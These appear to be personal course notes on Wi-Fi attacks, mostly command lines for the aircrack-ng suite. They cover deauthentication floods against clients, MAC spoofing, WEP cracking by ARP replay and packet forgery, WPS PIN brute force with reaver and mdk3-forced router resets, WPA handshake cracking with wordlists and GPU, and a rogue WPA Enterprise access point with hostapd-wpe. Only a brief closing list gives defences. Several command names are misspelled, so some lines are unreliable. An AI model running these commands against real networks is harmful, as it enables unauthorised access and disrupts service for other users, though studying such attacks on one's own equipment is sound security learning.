

airdump-ng --bssid < > --channels 2 mon0
aireplay-ng --deauth 10000000  -a < bssid> -c < station> -D  mon0                        ( if 5gz -D)
if victim is using the internet it means, victim might use another network if it is, then use the same command for the router
--------------------------------------------------------------------------------------------------------------------------
Hidden Networks
airodump-ng --bssid < > --channel < 6> mon0

To connect to a network; need to be in managed mode
#> airmon-ng stop wlan0mon 
#> iwconfig mon0 mode managed  
#> service network manager start
or physically disconnect and start network

-----------------------------------------------------------------------------------------------------------------------------
Mac filtering

Mac address is unique to each network device
Routers can use mac filtering to allow/deny devices from connecting based on their mac address
Implementation
Using a balcklist - allow all MAC to connect except the one in the list 
Using a whitlist - deny all MAC from connecting except the ones in the list 
Changing our MAC address to allowed MAC
macchanger -r       (random address)
macchanger -m   < specific address> wlan0

-------------------------------------------------------------------------------------------------------------
WEP
    - Wired Equivalent privacy
    - Old encryption
    - Uses an algorithm called RC4
    - Still used in some networks
    - Can be easily cracked
* Client encrypt data using key
* Encrypted packet sent in the air
* Router decrypt packet using the key
* Each packet is encrypted using a key stream 
* Random initialization vector (IV) is used to generate the key streams 
* The initializing vector is only 24 bits
* IV + key  (password) = Key stream
* IV is too small (only 24 bits)
* IV is sent in plain text
Result 
* IV's will repeat on busy network
* This makes WEP vulnerable to statistical network
* Repeated IVs can be used to determine the key stream and break the stream 

Conclustion
    - Capture a large number of packets/IVS         ------>  using airdump-ng 
    -  Analyse the captured IVs and crack the key   -------> using aircrack-ng

Problem 
    - If network is not busy
    - It would take some time to capture enough IVs
Solution 
    - Force the AP to generate new IVs

Problem
APs only communicate with connected client
We cant communicate with it
We cant even start the attack
Solution 
- Associate with the AP before launching the attack


airdump-ng --bssid <> --channel <> --write arpreplay mon0
aircrack-ng < basic_web-01.cap>           (key found)
aireplay-ng --fakeauth 0 -a <> -h <> mon0      (monitor mode enabled then = unspec 1st 6 digits)
----------------------------------------------------------
ARP Request Replay
* Wait for an ARP packet
* Capture it, and replay it (transmit it)
* This cause the AP to produce another packet with a new IV
* Keep doing this till we have enough IVs to crack the key
aireplay-ng --arpreplay  -b <> -h <> mon0     
aircrack-ng arpreplay-01
------------------------------------------------------------------------------------------------------------------
Packet Injection (Korek chop chop)

In this method we will capture an ARP packet and attempt to guess its key stream and use it to forge a new packet(using )
then we can inject this new forged packet into the new traffic  to generate new IVs
1. Capture a packet and determine its key stream
#> aireplay-ng --chopchop -b [target mac] -h [your mac] mon0

2. Forge a new packet
#> packetforge-ng -0 -a [target mac] -h [your mac] -k 255.255.255.255 -l 255.255.255.255 -y [out from last step.xor] -w [output ]

3. Inject the forged packet into the traffic to generate new IV's
#> aireplay-ng -2 -r [out from last step] [interface ]

aircrack-ng chopchop
* We captured the packet -- try to determine key stream -- 86% fake stream -- to air

---------------------------------------------------------------------------------------------------------------
WPS Lock
* We exploit WPS by bruteforcing its pin
* This means we try every possible pin
* Some routers lock after a number of failed attempts
Problem 
    - Locked routers refuse all pins even if we send it the right pin
Solution 
    - Try to somehow reset the router or get the user to reset their router


#> reaver --bssid <> --channel <> mon0 -A
#> reaver --bssid <> --channel <> mon0 -A -vvv 
#> reaver --bssid <> --channel <> -i  mon0  
#> wash -i mon0
Rourter stopped, keep deuthenticating the other users, then someone will turn off and turn on
-----------------------------------------------------------------------------------------------------------
MD3 is a tool designed to exploit a number of weakness in 802.11 protocol
Some of its exploits can cause the router to reset
Some routers unlock their WPS when they reset
mdk3 mon0 a -a < mac> -m 
--------------------------------------------------------------------------------------------------------------
WPA /WPA2 Cracking
Fixed all weakness in WEP
Packets contains no useful data 
Only packets that can aid with the cracking process are the handshake packets
These are 4 packets sent when a client connects to the network
--------------------------------------------------------------------------------------------------------------
WPA / WPA2 Cracking

*  The handshake does not contain data the helps recover the key
*  It contains data that can be used to check if a key is valid or not

aircrack-ng wpa_handshake-01.cap -w test.txt
----------------------------------------------------------------------------------------------------------------
Pause & Resume cracking

Problem:
    - Large wordlist can take a long time
    - Aircrack-ng starts doesn't save cracking progress
Solution 
    - Use a program that can store proress to read the wordlist
    - Pipe its output to aircrack-ng
--------------------------------------------------------------------------------------------------------------------
john  --wordlist=wpa-wordlist --stdout
john  --wordlist=wpa-wordlist  --stdout --session=upc | aircrack-ng -w - -b < mac> < ex: handshake-01.cap>   (-  get the wordlist from previous command)
john  --restore=upc | aircrack-ng -w - -b < mac> < ex: handshake-01.cap>   (-  get the wordlist from previous command)
crunch 8 8 | aircrack-ng -b < mac> -w - < handshake-01.cap>
-----------------------------------------------------------------------------------------------------------------------------
Piping wordlist to aircrack with pause & resume support

* Large wordlist can take a lot of space
*  Ideally we want to be able to:
    1. Use large wordlists without taking up disk space
    2. Stop cracking and resume without loosing progress

crunch 8 8 | john --stdin --session=session1 --stdout | aircrack-ng -b < mac address> -w - < handshake-01.cap>
crunch 8 8 | john --stdin --restore=session1 | aircrack-ng -b < mac address> -w - < handshake-01.cap>
-----------------------------------------------------------------------------------------------------------------------------------
Cracking WPA/WPA2  : Cracking the key

We are going to use aircrack-ng to crack the key. It does this by combining each password in the wordlist with AP name(essid) to compute a pairwise master key (PMK) using the pbkdf2 algoithm, the PMK is the compared to the handshake file.
#> aircrack-ng [HANDSHAKE ]  -w [wordlist] [interface]      
Computing the PMK is slow, and we only need the wordlist and the essid of the target AP to compute it. Therefore we can save time and compute the PMK for our wordlist while waiting for the handshake
1. Create a database and import wordlist
airlob-ng test.db --import paswd wpa-wordlist
2. Import target ESSID 
airolib-ng [db_name ] --import essid [essid file ]

echo "test.ap" > test-essid
cat test-essid
airolib-ng [db_name ] --import essid [essid file ]

3. Compute PMK for the wordlist 
airolib-ng [db_name ] --batch
4. Crack the key using the PMK database
aircrack-ng -r [db_name ] [handshake_file ]

--------------------------------------------------------------------------------------------------------
Cracking WPA/WPA2 using GPU

GPU is designed to carry out repetitve tasks fast
It is more efficient than the CPU at that
Cracking hashes is a repetitive task
---> GPU can be used to crack WPA/WPA2 faster
hashcat64.exe -m 2500 -d 1 handshake.hccapx < file name>

------------------------------------------------------------------------------------------------------------------
WPA Enterprise

All WPA/WPA2 networks we seen so far use PSK authentication
A shared key is used to authenticate users
One key per network
Router manages authentication
WPA Enterprise is another form of authentication
Each user get their own key to connect to the network
Authentication is managed through a central sever (RADIUS SERVER) 
---------------------------------------------------------------------------------------------------------------------
apt-get install hostpad-wpe
leafpad /etc/hostpad-wpe/hostpad-wpe.conf
service manager stop
hostapd-wpe [ location of the configuration file ]
Your password is never saved on the sever
asleap -C [ chanllenge] -R [ mac] -W [ file name ]

---------------------------------------------------------------------------------------------------------------------
1. Captive Portals
Open networks
No encryption is used
Lot of ways to get in

Solution
- Do not use captive portals
- Use WPA/WPA2 enterprise instead
2. WEP
Lot of methods to crack it
Even SKA networks can be cracked
Solution
- Do not use WEP

3. WPS
WPS pin is only 8 digits
Can be brute-force even if the router locks
Then it can be used to get the WPA/WPA2 key
Solution
Disable WPS

4.  Advanced worklist attacks
Work against all networks
Passwords can be cracked as long as its in the wordlist
Solution
Use long complex password of letters, numbers and symbols

5. Evil Twin attacks
Exploit the users
Work against all networks

Solution
-   Educate the users
-- Always connect to the right AP
-- Never enter password in a web interface
------------------------------------------------------------------------------------------------------------
wash i mon0
rever --bssid [  ] --channel [ ] -i mon0 -A -vvv             (-A not to associate with reaver, vvv- verbose output)
manually associate; do not associate
if router closed, deauthenticate to other users, some onewill push button
some routers will reset, if lot of mac coming, then Open mode
